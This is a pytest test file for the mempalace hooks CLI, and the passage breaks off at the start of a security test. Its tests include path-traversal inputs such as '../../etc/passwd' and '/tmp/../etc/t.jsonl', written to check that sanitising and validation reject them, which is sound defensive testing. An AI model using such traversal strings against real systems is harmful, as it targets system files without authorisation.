import contextlib
import io
import json
import os
import subprocess
from pathlib import Path
from unittest.mock import patch

import pytest

import mempalace.hooks_cli as hooks_cli_mod
from mempalace.hooks_cli import (
    SAVE_INTERVAL,
    USERPROMPT_PREVIOUS_ASSISTANT_TAIL_CHARS,
    _count_human_messages,
    _extract_first_json_object,
    _get_last_assistant_message,
    _get_mine_targets,
    _log,
    _maybe_auto_ingest,
    _mine_already_running,
    _parse_harness_input,
    _sanitize_session_id,
    _validate_transcript_path,
    _wing_from_transcript_path,
    hook_stop,
    hook_session_start,
    hook_precompact,
    run_hook,
    hook_userprompt,
)


@pytest.fixture(autouse=True)
def _present_palace_root(monkeypatch, tmp_path):
    """Most hook tests exercise normal operation; absent-root tests override this."""
    fake_root = tmp_path / "__mempalace-root"
    fake_root.mkdir(exist_ok=True)
    monkeypatch.setattr(hooks_cli_mod, "PALACE_ROOT", fake_root)
    monkeypatch.setattr(hooks_cli_mod, "_state_dir_initialized", False)


# --- _sanitize_session_id ---


def test_sanitize_normal_id():
    assert _sanitize_session_id("abc-123_XYZ") == "abc-123_XYZ"


def test_sanitize_strips_dangerous_chars():
    assert _sanitize_session_id("../../etc/passwd") == "etcpasswd"


def test_sanitize_empty_returns_unknown():
    assert _sanitize_session_id("") == "unknown"
    assert _sanitize_session_id("!!!") == "unknown"


# --- _count_human_messages ---


def _write_transcript(path: Path, entries: list[dict]):
    with open(path, "w", encoding="utf-8") as f:
        for entry in entries:
            f.write(json.dumps(entry) + "\n")


def test_count_human_messages_basic(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [
            {"message": {"role": "user", "content": "hello"}},
            {"message": {"role": "assistant", "content": "hi"}},
            {"message": {"role": "user", "content": "bye"}},
        ],
    )
    assert _count_human_messages(str(transcript)) == 2


def test_count_skips_command_messages(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [
            {"message": {"role": "user", "content": "<command-message>status</command-message>"}},
            {"message": {"role": "user", "content": "real question"}},
        ],
    )
    assert _count_human_messages(str(transcript)) == 1


def test_count_handles_list_content(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [
            {"message": {"role": "user", "content": [{"type": "text", "text": "hello"}]}},
            {
                "message": {
                    "role": "user",
                    "content": [{"type": "text", "text": "<command-message>x</command-message>"}],
                }
            },
        ],
    )
    assert _count_human_messages(str(transcript)) == 1


def test_count_missing_file():
    assert _count_human_messages("/nonexistent/path.jsonl") == 0


def test_count_empty_file(tmp_path):
    transcript = tmp_path / "t.jsonl"
    transcript.write_text("")
    assert _count_human_messages(str(transcript)) == 0


def test_count_malformed_json_lines(tmp_path):
    transcript = tmp_path / "t.jsonl"
    transcript.write_text('not json\n{"message": {"role": "user", "content": "ok"}}\n')
    assert _count_human_messages(str(transcript)) == 1


def test_get_last_assistant_message_extracts_claude_text_and_ignores_tool_blocks(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [
            {
                "type": "assistant",
                "message": {
                    "content": [
                        {"type": "text", "text": "Explained the database setup."},
                        {"type": "tool_use", "name": "Read", "input": {"file_path": "x"}},
                        {"type": "tool_result", "tool_use_id": "1", "content": "ignored"},
                        {"type": "text", "text": "Use the staging credentials."},
                    ]
                },
            },
            {
                "type": "assistant",
                "message": {"content": [{"type": "tool_use", "name": "Read"}]},
            },
        ],
    )
    assert _get_last_assistant_message(str(transcript)) == (
        "Explained the database setup.\nUse the staging credentials."
    )


def test_get_last_assistant_message_extracts_codex_agent_message(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [
            {"type": "session_meta", "payload": {}},
            {"type": "event_msg", "payload": {"type": "user_message", "message": "Q"}},
            {"type": "response_item", "payload": {"type": "agent_message", "message": "skip me"}},
            {"type": "event_msg", "payload": {"type": "agent_message", "message": "Real answer"}},
        ],
    )
    assert _get_last_assistant_message(str(transcript)) == "Real answer"


# --- hook_stop ---


def _capture_hook_output(hook_fn, data, harness="claude-code", state_dir=None):
    """Run a hook and capture its JSON stdout output."""
    import io

    buf = io.StringIO()
    patches = [patch("mempalace.hooks_cli._output", side_effect=lambda d: buf.write(json.dumps(d)))]
    if state_dir:
        patches.append(patch("mempalace.hooks_cli.STATE_DIR", state_dir))
    with contextlib.ExitStack() as stack:
        for p in patches:
            stack.enter_context(p)
        hook_fn(data, harness)
    return json.loads(buf.getvalue())


def test_stop_hook_passthrough_when_active(tmp_path):
    with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
        result = _capture_hook_output(
            hook_stop,
            {"session_id": "test", "stop_hook_active": True, "transcript_path": ""},
            state_dir=tmp_path,
        )
    assert result == {}


def test_stop_hook_passthrough_when_active_string(tmp_path):
    with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
        result = _capture_hook_output(
            hook_stop,
            {"session_id": "test", "stop_hook_active": "true", "transcript_path": ""},
            state_dir=tmp_path,
        )
    assert result == {}


def test_stop_hook_passthrough_below_interval(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL - 1)],
    )
    result = _capture_hook_output(
        hook_stop,
        {"session_id": "test", "stop_hook_active": False, "transcript_path": str(transcript)},
        state_dir=tmp_path,
    )
    assert result == {}


def test_stop_hook_blocks_at_interval(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
    )
    result = _capture_hook_output(
        hook_stop,
        {"session_id": "test", "stop_hook_active": False, "transcript_path": str(transcript)},
        state_dir=tmp_path,
    )
    assert result == {}


def test_stop_hook_tracks_save_point(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
    )
    data = {"session_id": "test", "stop_hook_active": False, "transcript_path": str(transcript)}

    # First call triggers async save (non-blocking)
    result = _capture_hook_output(hook_stop, data, state_dir=tmp_path)
    assert result == {}

    # Second call with same count passes through (already saved)
    result = _capture_hook_output(hook_stop, data, state_dir=tmp_path)
    assert result == {}


def test_stop_hook_caches_last_assistant_reply_by_session_id(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [
            {"message": {"role": "user", "content": "How do I connect?"}},
            {
                "type": "assistant",
                "message": {
                    "content": [
                        {"type": "text", "text": "Use host db.internal."},
                        {"type": "tool_use", "name": "Read", "input": {"file_path": "README.md"}},
                        {"type": "tool_result", "tool_use_id": "t1", "content": "ignored"},
                        {"type": "text", "text": "Port is 5432."},
                    ]
                },
            },
        ],
    )

    result = _capture_hook_output(
        hook_stop,
        {"session_id": "test", "stop_hook_active": False, "transcript_path": str(transcript)},
        state_dir=tmp_path,
    )

    assert result == {}
    assert (tmp_path / "test_last_assistant").read_text(encoding="utf-8") == (
        "Use host db.internal.\nPort is 5432."
    )


def test_stop_hook_does_not_cache_last_assistant_when_active(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [
            {
                "type": "assistant",
                "message": {"content": "This should not be cached during a save cycle."},
            },
        ],
    )

    result = _capture_hook_output(
        hook_stop,
        {"session_id": "test", "stop_hook_active": True, "transcript_path": str(transcript)},
        state_dir=tmp_path,
    )

    assert result == {}
    assert not (tmp_path / "test_last_assistant").exists()


def test_stop_hook_unknown_session_id_does_not_cache_assistant(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [
            {
                "type": "assistant",
                "message": {"content": "Unknown sessions should not persist assistant state."},
            },
        ],
    )

    result = _capture_hook_output(
        hook_stop,
        {"session_id": "!!!", "stop_hook_active": False, "transcript_path": str(transcript)},
        state_dir=tmp_path,
    )

    assert result == {}
    assert not (tmp_path / "unknown_last_assistant").exists()


# --- hook_session_start ---


def test_session_start_passes_through(tmp_path):
    result = _capture_hook_output(
        hook_session_start,
        {"session_id": "test"},
        state_dir=tmp_path,
    )
    assert result == {}


# --- hook_precompact ---


def test_precompact_allows(tmp_path):
    result = _capture_hook_output(
        hook_precompact,
        {"session_id": "test"},
        state_dir=tmp_path,
    )
    assert result == {}


# --- _wing_from_transcript_path ---


def test_wing_from_transcript_path_extracts_project():
    path = "/home/jp/.claude/projects/-home-jp-Projects-memorypalace/session.jsonl"
    assert _wing_from_transcript_path(path) == "wing_memorypalace"


def test_wing_from_transcript_path_fallback():
    assert _wing_from_transcript_path("/some/random/path.jsonl") == "wing_sessions"


def test_wing_from_transcript_path_windows_backslashes():
    path = "C:\\Users\\jp\\.claude\\projects\\-home-jp-Projects-myapp\\session.jsonl"
    assert _wing_from_transcript_path(path) == "wing_myapp"


def test_wing_from_transcript_path_lowercases():
    path = "/home/jp/.claude/projects/-home-jp-Projects-MyProject/session.jsonl"
    assert _wing_from_transcript_path(path) == "wing_myproject"


def test_wing_from_transcript_path_non_projects_layout():
    # Linux users with code under ~/dev/, ~/src/, ~/code/ — no -Projects- segment.
    # Project name is the final dash-separated token of the encoded folder.
    path = "/home/igor/.claude/projects/-home-igor-dev-MemPalace-mempalace/session.jsonl"
    assert _wing_from_transcript_path(path) == "wing_mempalace"


def test_wing_from_transcript_path_macos_users_layout():
    # macOS ~/ layout without a Projects/ segment.
    path = "/Users/alice/.claude/projects/-Users-alice-code-MyApp/session.jsonl"
    assert _wing_from_transcript_path(path) == "wing_myapp"


def test_wing_from_transcript_path_nested_deep():
    path = "/home/bob/.claude/projects/-home-bob-work-clients-acme-frontend/session.jsonl"
    assert _wing_from_transcript_path(path) == "wing_frontend"


# --- _log ---


def test_log_writes_to_hook_log(tmp_path):
    with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
        _log("test message")
    log_path = tmp_path / "hook.log"
    assert log_path.is_file()
    content = log_path.read_text()
    assert "test message" in content


def test_log_oserror_is_silenced(tmp_path):
    """_log should not raise if the directory cannot be created."""
    with patch("mempalace.hooks_cli.STATE_DIR", Path("/nonexistent/deeply/nested/dir")):
        # Should not raise
        _log("this will fail silently")


# --- _maybe_auto_ingest ---


def test_maybe_auto_ingest_no_env(tmp_path):
    """Without MEMPAL_DIR or transcript_path, does nothing."""
    with patch.dict("os.environ", {}, clear=True):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            _maybe_auto_ingest()  # should not raise


def test_maybe_auto_ingest_with_env(tmp_path):
    """With MEMPAL_DIR set to a valid directory, spawns subprocess."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._MINE_PID_FILE", tmp_path / "mine.pid"):
                with patch("mempalace.hooks_cli.subprocess.Popen") as mock_popen:
                    _maybe_auto_ingest()
                    mock_popen.assert_called_once()


def test_maybe_auto_ingest_with_transcript(tmp_path):
    """Transcript directories are not auto-mined by _maybe_auto_ingest."""
    transcript = tmp_path / "t.jsonl"
    transcript.write_text("")
    with patch.dict("os.environ", {}, clear=True):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._MINE_PID_FILE", tmp_path / "mine.pid"):
                with patch("mempalace.hooks_cli.subprocess.Popen") as mock_popen:
                    _maybe_auto_ingest()
                    mock_popen.assert_not_called()


def test_maybe_auto_ingest_oserror(tmp_path):
    """OSError during subprocess spawn is silenced."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._MINE_PID_FILE", tmp_path / "mine.pid"):
                with patch("mempalace.hooks_cli.subprocess.Popen", side_effect=OSError("fail")):
                    _maybe_auto_ingest()  # should not raise


def test_maybe_auto_ingest_skips_when_mine_running(tmp_path):
    """Does not spawn a new mine process if one is already running."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._claim_mine_slot", return_value=None):
                with patch("mempalace.hooks_cli.subprocess.Popen") as mock_popen:
                    _maybe_auto_ingest()
                    mock_popen.assert_not_called()


# --- _mine_already_running ---


def test_mine_already_running_no_file(tmp_path):
    """Returns False when no PID file exists."""
    with patch("mempalace.hooks_cli._MINE_PID_FILE", tmp_path / "mine.pid"):
        assert _mine_already_running() is False


def test_mine_already_running_dead_pid(tmp_path):
    """Returns False when PID file contains a PID that no longer exists."""
    pid_file = tmp_path / "mine.pid"
    pid_file.write_text("999999999")  # almost certainly not a real PID
    with patch("mempalace.hooks_cli._MINE_PID_FILE", pid_file):
        assert _mine_already_running() is False


def test_mine_already_running_live_pid(tmp_path):
    """Returns True when PID file contains the current process's own PID."""
    pid_file = tmp_path / "mine.pid"
    pid_file.write_text(str(os.getpid()))  # current process is definitely alive
    with patch("mempalace.hooks_cli._MINE_PID_FILE", pid_file):
        assert _mine_already_running() is True


def test_mine_already_running_corrupt_file(tmp_path):
    """Returns False when PID file contains non-integer content."""
    pid_file = tmp_path / "mine.pid"
    pid_file.write_text("not-a-pid")
    with patch("mempalace.hooks_cli._MINE_PID_FILE", pid_file):
        assert _mine_already_running() is False


# --- _get_mine_targets ---


def test_get_mine_targets_mempal_dir_only(tmp_path):
    """MEMPAL_DIR alone yields a single projects target, expanded/resolved."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        targets = _get_mine_targets()
    assert len(targets) == 1
    assert Path(targets[0][0]).resolve() == mempal_dir.resolve()
    assert targets[0][1] == "projects"


def test_get_mine_targets_mempal_dir_tilde(tmp_path):
    """MEMPAL_DIR with a tilde prefix is expanded correctly."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    home = Path.home()
    try:
        rel = mempal_dir.relative_to(home)
    except ValueError:
        pytest.skip("tmp_path is not under home, cannot build ~-relative path")
    tilde_path = "~/" + str(rel)
    with patch.dict("os.environ", {"MEMPAL_DIR": tilde_path}):
        targets = _get_mine_targets()
    assert len(targets) == 1
    assert Path(targets[0][0]).resolve() == mempal_dir.resolve()
    assert targets[0][1] == "projects"


def test_get_mine_targets_no_transcript_target(tmp_path):
    """_get_mine_targets does not emit a convos target for the transcript path.

    Transcript ingestion is owned by _ingest_transcript; emitting it
    here too would double-mine the same JSONL into a different wing on
    every hook fire (#1231 review).
    """
    transcript = tmp_path / "t.jsonl"
    transcript.write_text("")
    with patch.dict("os.environ", {}, clear=True):
        targets = _get_mine_targets()
    assert targets == []


def test_get_mine_targets_only_returns_mempal_dir(tmp_path):
    """When MEMPAL_DIR is set, exactly one projects target — never a convos target."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        targets = _get_mine_targets()
    assert len(targets) == 1
    assert targets[0][1] == "projects"


def test_validate_transcript_path_traversal_rejected_jsonl(tmp_path):
    """Path traversal is rejected even when the path has a .jsonl suffix.

    The pre-fix test used "../../etc/passwd" which lacks an extension and
    so was rejected by the suffix gate before the traversal check ever
    fired (Copilot review on #1231). Use a .jsonl path with `..`
    segments to exercise the traversal guard specifically.
    """
    assert _validate_transcript_path("../t.jsonl") is None
    assert _validate_transcript_path("a/../b.jsonl") is None
    assert _validate_transcript_path("/tmp/../etc/t.jsonl") is None


def test_get_mine_targets_empty():
    """Returns empty list when MEMPAL_DIR is unset or invalid."""
    with patch.dict("os.environ", {}, clear=True):
        assert _get_mine_targets() == []


# --- _parse_harness_input ---


def test_parse_harness_input_unknown():
    """Unknown harness should sys.exit(1)."""
    with pytest.raises(SystemExit) as exc_info:
        _parse_harness_input({"session_id": "test"}, "unknown-harness")
    assert exc_info.value.code == 1


def test_parse_harness_input_valid():
    result = _parse_harness_input(
        {"session_id": "abc-123", "stop_hook_active": True, "transcript_path": "/tmp/t.jsonl"},
        "claude-code",
    )
    assert result["session_id"] == "abc-123"
    assert result["stop_hook_active"] is True


# --- hook_stop with OSError on write ---


def test_stop_hook_oserror_on_last_save_read(tmp_path):
    """When last_save_file has invalid content, falls back to 0."""
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
    )
    # Write invalid content to last save file
    (tmp_path / "test_last_save").write_text("not_a_number")
    result = _capture_hook_output(
        hook_stop,
        {"session_id": "test", "stop_hook_active": False, "transcript_path": str(transcript)},
        state_dir=tmp_path,
    )
    assert result == {}


def test_stop_hook_oserror_on_write(tmp_path):
    """When write to last_save_file fails, hook still outputs correctly."""
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
    )

    def bad_write_text(*args, **kwargs):
        raise OSError("disk full")

    with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
        with patch.object(Path, "write_text", bad_write_text):
            result = _capture_hook_output(
                hook_stop,
                {
                    "session_id": "test",
                    "stop_hook_active": False,
                    "transcript_path": str(transcript),
                },
                state_dir=tmp_path,
            )
    assert result == {}


# --- hook_precompact with MEMPAL_DIR ---


def test_precompact_with_mempal_dir(tmp_path):
    """Precompact no longer auto-mines (removed to prevent noise ingestion)."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        with patch("mempalace.hooks_cli.subprocess.run") as mock_run:
            result = _capture_hook_output(
                hook_precompact,
                {"session_id": "test"},
                state_dir=tmp_path,
            )
    assert result == {}
    mock_run.assert_not_called()


def test_precompact_with_mempal_dir_oserror(tmp_path):
    """Precompact handles missing MEMPAL_DIR gracefully (no mining attempted)."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        result = _capture_hook_output(
            hook_precompact,
            {"session_id": "test"},
            state_dir=tmp_path,
        )
    assert result == {}


def test_precompact_with_timeout(tmp_path):
    """Precompact handles TimeoutExpired gracefully -- still allows."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        with patch(
            "mempalace.hooks_cli.subprocess.run",
            side_effect=subprocess.TimeoutExpired(cmd="mine", timeout=60),
        ):
            result = _capture_hook_output(
                hook_precompact, {"session_id": "test"}, state_dir=tmp_path
            )
    assert result == {}


def test_precompact_mines_transcript_dir(tmp_path, monkeypatch):
    """Precompact no longer mines transcript directory (auto-mine removed)."""
    transcript = tmp_path / "t.jsonl"
    transcript.write_text("")
    monkeypatch.delenv("MEMPAL_DIR", raising=False)
    with patch("mempalace.hooks_cli.subprocess.run") as mock_run:
        result = _capture_hook_output(
            hook_precompact,
            {"session_id": "test", "transcript_path": str(transcript)},
            state_dir=tmp_path,
        )
    assert result == {}
    mock_run.assert_not_called()


# --- hook_userprompt ---


def test_userprompt_uses_cached_previous_assistant_tail_for_short_followup(tmp_path):
    palace_dir = tmp_path / "palace"
    palace_dir.mkdir()

    previous_assistant = "A" * 550 + "TAIL"
    (tmp_path / "session-a_last_assistant").write_text(previous_assistant, encoding="utf-8")

    captured = {}

    def fake_search_memories(**kwargs):
        captured.update(kwargs)
        return {
            "results": [
                {
                    "wing": "mempalace",
                    "room": "decisions",
                    "text": "Remembered context",
                }
            ]
        }

    fake_config = type("FakeConfig", (), {"palace_path": str(palace_dir)})()

    with patch.dict("os.environ", {"MEMPAL_RECALL_LLM": "0"}, clear=False):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.config.MempalaceConfig", return_value=fake_config):
                with patch("mempalace.searcher.search_memories", side_effect=fake_search_memories):
                    result = _capture_hook_output(
                        hook_userprompt,
                        {"session_id": "session-a", "prompt": "why?", "cwd": "/tmp/project"},
                        state_dir=tmp_path,
                    )

    expected_tail = previous_assistant[-USERPROMPT_PREVIOUS_ASSISTANT_TAIL_CHARS:]
    assert captured["query"] == f"{expected_tail}\n\nwhy?"
    assert result["hookSpecificOutput"]["hookEventName"] == "UserPromptSubmit"
    assert "Remembered context" in result["hookSpecificOutput"]["additionalContext"]


def test_userprompt_skips_acknowledgement_even_with_cached_assistant_context(tmp_path):
    palace_dir = tmp_path / "palace"
    palace_dir.mkdir()
    (tmp_path / "session-a_last_assistant").write_text("Previous assistant reply", encoding="utf-8")

    fake_config = type("FakeConfig", (), {"palace_path": str(palace_dir)})()

    with patch.dict("os.environ", {"MEMPAL_RECALL_LLM": "0"}, clear=False):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.config.MempalaceConfig", return_value=fake_config):
                with patch("mempalace.searcher.search_memories") as mock_search:
                    result = _capture_hook_output(
                        hook_userprompt,
                        {"session_id": "session-a", "prompt": "ok", "cwd": "/tmp/project"},
                        state_dir=tmp_path,
                    )

    assert result == {}
    mock_search.assert_not_called()


def test_userprompt_does_not_reuse_cached_assistant_from_other_session(tmp_path):
    palace_dir = tmp_path / "palace"
    palace_dir.mkdir()
    (tmp_path / "session-a_last_assistant").write_text("Previous assistant reply", encoding="utf-8")

    fake_config = type("FakeConfig", (), {"palace_path": str(palace_dir)})()

    with patch.dict("os.environ", {"MEMPAL_RECALL_LLM": "0"}, clear=False):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.config.MempalaceConfig", return_value=fake_config):
                with patch("mempalace.searcher.search_memories") as mock_search:
                    result = _capture_hook_output(
                        hook_userprompt,
                        {"session_id": "session-b", "prompt": "why?", "cwd": "/tmp/project"},
                        state_dir=tmp_path,
                    )

    assert result == {}
    mock_search.assert_not_called()


def test_userprompt_passes_previous_assistant_context_into_rerank(tmp_path):
    palace_dir = tmp_path / "palace"
    palace_dir.mkdir()
    previous_assistant = "Earlier I explained the Codex hook behavior."
    (tmp_path / "session-a_last_assistant").write_text(previous_assistant, encoding="utf-8")

    fake_config = type("FakeConfig", (), {"palace_path": str(palace_dir)})()
    rerank_calls = {}

    def fake_search_memories(**kwargs):
        return {
            "results": [
                {"wing": "mempalace", "room": "decisions", "text": f"hit {i}"} for i in range(6)
            ]
        }

    def fake_decide_recall(*args, **kwargs):
        return {
            "should_recall": True,
            "reason": "short_followup_depends_on_previous_assistant",
            "query": "codex hooks",
            "after": None,
        }

    def fake_rerank(user_prompt, hits, top_k=5, config=None, previous_assistant_context=None):
        rerank_calls["user_prompt"] = user_prompt
        rerank_calls["previous_assistant_context"] = previous_assistant_context
        return hits[:top_k]

    with patch.dict("os.environ", {"MEMPAL_RECALL_LLM": "1"}, clear=False):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.config.MempalaceConfig", return_value=fake_config):
                with patch("mempalace.searcher.search_memories", side_effect=fake_search_memories):
                    with patch("mempalace.recall_llm.is_enabled", return_value=True):
                        with patch(
                            "mempalace.recall_llm._get_llm_config",
                            return_value={"backend": "stub"},
                        ):
                            with patch(
                                "mempalace.recall_llm.decide_recall",
                                side_effect=fake_decide_recall,
                            ):
                                with patch(
                                    "mempalace.recall_llm.rerank",
                                    side_effect=fake_rerank,
                                ):
                                    result = _capture_hook_output(
                                        hook_userprompt,
                                        {
                                            "session_id": "session-a",
                                            "prompt": "why?",
                                            "cwd": "/tmp/project",
                                        },
                                        state_dir=tmp_path,
                                    )

    assert result["hookSpecificOutput"]["hookEventName"] == "UserPromptSubmit"
    assert rerank_calls["user_prompt"] == "why?"
    assert rerank_calls["previous_assistant_context"] == {
        "tail": previous_assistant[-USERPROMPT_PREVIOUS_ASSISTANT_TAIL_CHARS:]
    }


def test_userprompt_ignores_llm_should_recall_false_and_lets_rerank_decide(tmp_path):
    """LLM gate's should_recall=false no longer short-circuits the pipeline.

    We trust rerank — which sees actual candidate drawers — to filter relevance,
    rather than the gate which only sees the prompt and over-prunes."""
    palace_dir = tmp_path / "palace"
    palace_dir.mkdir()
    previous_assistant = "Earlier I explained the Codex hook behavior."
    (tmp_path / "session-a_last_assistant").write_text(previous_assistant, encoding="utf-8")

    fake_config = type("FakeConfig", (), {"palace_path": str(palace_dir)})()

    def fake_decide_recall(*args, **kwargs):
        return {
            "should_recall": False,
            "reason": "direct_local_task_no_memory_needed",
            "query": None,
            "after": None,
        }

    def fake_search_memories(**kwargs):
        return {"results": [{"wing": "x", "room": "y", "text": "topic-adjacent noise"}]}

    rerank_calls = {}

    def fake_rerank(user_prompt, hits, top_k=5, config=None, previous_assistant_context=None):
        rerank_calls["called"] = True
        # Rerank sees the candidates and decides nothing is relevant — empty list.
        return []

    with patch.dict("os.environ", {"MEMPAL_RECALL_LLM": "1"}, clear=False):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.config.MempalaceConfig", return_value=fake_config):
                with patch(
                    "mempalace.searcher.search_memories", side_effect=fake_search_memories
                ) as mock_search:
                    with patch("mempalace.recall_llm.is_enabled", return_value=True):
                        with patch(
                            "mempalace.recall_llm._get_llm_config",
                            return_value={"backend": "stub"},
                        ):
                            with patch(
                                "mempalace.recall_llm.decide_recall",
                                side_effect=fake_decide_recall,
                            ):
                                with patch(
                                    "mempalace.recall_llm.rerank",
                                    side_effect=fake_rerank,
                                ):
                                    result = _capture_hook_output(
                                        hook_userprompt,
                                        {
                                            "session_id": "session-a",
                                            "prompt": "format this json",
                                            "cwd": "/tmp/project",
                                        },
                                        state_dir=tmp_path,
                                    )

    # Pipeline runs through search and rerank despite gate saying skip.
    mock_search.assert_called()
    assert rerank_calls.get("called") is True
    # Rerank filtered everything → empty recall block.
    assert result == {}


def test_userprompt_session_local_continue_skips_before_search(tmp_path):
    palace_dir = tmp_path / "palace"
    palace_dir.mkdir()
    (tmp_path / "session-a_last_assistant").write_text(
        "Earlier I explained the remaining work plan.",
        encoding="utf-8",
    )

    fake_config = type("FakeConfig", (), {"palace_path": str(palace_dir)})()

    with patch.dict("os.environ", {"MEMPAL_RECALL_LLM": "0"}, clear=False):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.config.MempalaceConfig", return_value=fake_config):
                with patch("mempalace.searcher.search_memories") as mock_search:
                    result = _capture_hook_output(
                        hook_userprompt,
                        {
                            "session_id": "session-a",
                            "prompt": "继续推进，直到完全修复完成",
                            "cwd": "/tmp/project",
                        },
                        state_dir=tmp_path,
                    )

    assert result == {}
    mock_search.assert_not_called()


def test_userprompt_history_continue_can_still_recall(tmp_path):
    palace_dir = tmp_path / "palace"
    palace_dir.mkdir()
    (tmp_path / "session-a_last_assistant").write_text(
        "Earlier I explained the previous migration plan.",
        encoding="utf-8",
    )

    fake_config = type("FakeConfig", (), {"palace_path": str(palace_dir)})()

    with patch.dict("os.environ", {"MEMPAL_RECALL_LLM": "0"}, clear=False):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.config.MempalaceConfig", return_value=fake_config):
                with patch("mempalace.searcher.search_memories") as mock_search:
                    mock_search.return_value = {
                        "results": [
                            {"wing": "mempalace", "room": "decisions", "text": "Remembered context"}
                        ]
                    }
                    result = _capture_hook_output(
                        hook_userprompt,
                        {
                            "session_id": "session-a",
                            "prompt": "按之前那个方案继续推进",
                            "cwd": "/tmp/project",
                        },
                        state_dir=tmp_path,
                    )

    assert result["hookSpecificOutput"]["hookEventName"] == "UserPromptSubmit"
    mock_search.assert_called_once()


# --- run_hook ---


def test_run_hook_dispatches_session_start(tmp_path):
    """run_hook reads stdin JSON and dispatches to correct handler."""
    stdin_data = json.dumps({"session_id": "run-test"})
    with patch("sys.stdin", io.StringIO(stdin_data)):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._output") as mock_output:
                run_hook("session-start", "claude-code")
    mock_output.assert_called_once_with({})


def test_run_hook_dispatches_stop(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL - 1)],
    )
    stdin_data = json.dumps(
        {
            "session_id": "run-test",
            "stop_hook_active": False,
            "transcript_path": str(transcript),
        }
    )
    with patch("sys.stdin", io.StringIO(stdin_data)):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._output") as mock_output:
                run_hook("stop", "claude-code")
    mock_output.assert_called_once_with({})


def test_run_hook_dispatches_precompact(tmp_path):
    stdin_data = json.dumps({"session_id": "run-test"})
    with patch("sys.stdin", io.StringIO(stdin_data)):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._output") as mock_output:
                run_hook("precompact", "claude-code")
    mock_output.assert_called_once_with({})


def test_run_hook_unknown_hook():
    stdin_data = json.dumps({"session_id": "test"})
    with patch("sys.stdin", io.StringIO(stdin_data)):
        with pytest.raises(SystemExit) as exc_info:
            run_hook("nonexistent", "claude-code")
        assert exc_info.value.code == 1


def test_run_hook_invalid_json(tmp_path):
    """Invalid stdin JSON should not crash — falls back to empty dict."""
    with patch("sys.stdin", io.StringIO("not valid json")):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._output") as mock_output:
                run_hook("session-start", "claude-code")
    mock_output.assert_called_once_with({})


# --- Security: transcript_path validation ---


def test_validate_transcript_rejects_path_traversal():
